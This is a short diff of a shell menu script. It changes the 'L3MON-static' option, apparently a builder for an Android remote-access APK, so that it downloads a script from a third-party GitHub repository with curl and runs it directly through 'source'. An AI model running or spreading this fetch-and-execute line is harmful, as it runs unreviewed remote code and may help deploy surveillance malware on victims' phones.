@@ -36,7 +36,7 @@ echo
 echo
   echo -e "${Green} Your pressed L3MON-static${clean}"
   sleep 1
-source <(curl -fsSL https://raw.************************link.sh)
+source <(curl -fsSL https://raw.githubusercontent.com/database2022/l3monfix/main/LIZ-BuildAPK.sh)
 echo;;
   
 3)
